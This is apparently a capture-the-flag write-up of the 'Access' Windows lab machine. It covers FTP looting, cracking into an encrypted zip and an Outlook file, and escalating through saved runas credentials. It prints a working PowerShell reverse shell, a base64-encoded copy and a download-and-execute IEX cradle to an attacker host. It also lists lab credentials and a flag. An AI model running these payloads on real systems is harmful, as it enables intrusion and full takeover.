+++
title = 'Access'
description = 'Easy Windows'
writeup = true
hideMeta = true
+++

nmap scan.

```bash
nmap -p- -vv -T4 -Pn --min-rate=1000 -sC
```

![Access (Easy Windows).png](Access%20%28Easy%20Windows%29.png)

The website is just a static page.

![Access (Easy Windows)-1.png](Access%20%28Easy%20Windows%29-1.png)

Searching for `LON-MC6` immediately surfaces MS09-042 - a Telnet vulnerability that could allow RCE. Port 23 is open with telnet:

```bash
telnet 10.129.241.188
```

A "Welcome to Microsoft Telnet Service" message appears and a login is required.

Let's look at port 21, FTP - anonymous login is valid. There are a couple of files on the FTP server: `backup.mdb` (an MS Access database) which wasn't downloading properly, and `Access Control.zip` which is encrypted.

Back to the telnet vulnerability idea... I peeked at the walkthrough - downloading the files over FTP was correct; I just had to switch to **binary mode** to download them properly.

![Access (Easy Windows)-2.png](Access%20%28Easy%20Windows%29-2.png)

Create CSVs of every table:

![Access (Easy Windows)-3.png](Access%20%28Easy%20Windows%29-3.png)

`auth_group`:

![Access (Easy Windows)-4.png](Access%20%28Easy%20Windows%29-4.png)

We can see `administrator` is an Administrator-level account. Looking at `auth_user`:

![Access (Easy Windows)-5.png](Access%20%28Easy%20Windows%29-5.png)

- `admin` : `admin`
- `engineer` : `access4u@security`
- `backup_admin` : `admin`

![Access (Easy Windows)-6.png](Access%20%28Easy%20Windows%29-6.png)

Those credentials didn't work with telnet - but maybe they work for FTP or to decrypt the zip. The engineer password opened the zip:

```bash
7z x Access\ Control.zip
```

That gives `Access Control.pst` - a Microsoft Outlook Personal Storage file.

```bash
sudo apt install pst-utils
```

to be able to read it on Linux. Reading the email:

![Access (Easy Windows)-7.png](Access%20%28Easy%20Windows%29-7.png)

`security` : `4Cc3ssC0ntr0ller`

Tried it on telnet:

![Access (Easy Windows)-8.png](Access%20%28Easy%20Windows%29-8.png)

user.txt = `ab2ab8f61dd197103a7a84665b4b04ff`

I didn't know what I was doing with privesc at this point, so I paused and went to watch/read some privesc material.

![Access (Easy Windows)-9.png](Access%20%28Easy%20Windows%29-9.png)

Running `cmdkey /list`:

![Access (Easy Windows)-10.png](Access%20%28Easy%20Windows%29-10.png)

More info from the HackTricks Windows privesc page: Windows Vault stores credentials that Windows can log in the user automatically, meaning any Windows application that needs credentials to access a resource (server or website) can use Credential Manager & Windows Vault instead of the user entering username/password every time.

```powershell
powershell -NoProfile -NonInteractive -Command "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.196',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()"
```

![Access (Easy Windows)-11.png](Access%20%28Easy%20Windows%29-11.png)

`runas` opens a new window, so it can't just run cmd.exe for us.

```powershell
# Enumerate through all *.lnk files (shortcut files) on the system and examine them for the runas command
Get-ChildItem "C:\" *.lnk -Recurse -Force | ft fullname | Out-File shortcuts.txt
# shortcuts.txt has paths to all .lnk files, now we look for runas in the file
ForEach($file in gc .\shortcuts.txt) { Write-Output $file; gc $file | Select-String runas }
```

![Access (Easy Windows)-12.png](Access%20%28Easy%20Windows%29-12.png)

It shows `ZKTeco\ZKAccess3.5\Access.exe` is being run with saved creds using `runas`.

```powershell
runas /user:ACCESS\Administrator /savecred "powershell -NoProfile -NonInteractive -EncodedCommand IiRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE2LjE5NicsMTIzNCk7ICRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpOyBbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07IHdoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkgeyAkZGF0YSA9IChOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwkaSk7ICRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcpOyAkc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzsgJHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyAkc3RyZWFtLkZsdXNoKCkgfTsgJGNsaWVudC5DbG9zZSgpIgo="
```

That wasn't working, so I went through the walkthrough. Put the payload into a file `admin.ps1` and serve it:

![Access (Easy Windows)-15.png](Access%20%28Easy%20Windows%29-15.png)

![Access (Easy Windows)-13.png](Access%20%28Easy%20Windows%29-13.png)

Use:

```powershell
runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.196/admin.ps1')"
```

- `runas /user:ACCESS\Administrator /savecred`: runs a command as another user (Administrator) using saved credentials - if the credentials were previously entered and saved, it won't prompt again.
- `powershell -c IEX (...)`: executes a PowerShell command that downloads and runs a remote script (`admin.ps1`) from your attacking machine.
- `IEX` (Invoke-Expression): executes the string returned by `DownloadString`, which is your reverse shell payload.

![Access (Easy Windows)-14.png](Access%20%28Easy%20Windows%29-14.png)

Admin shell.
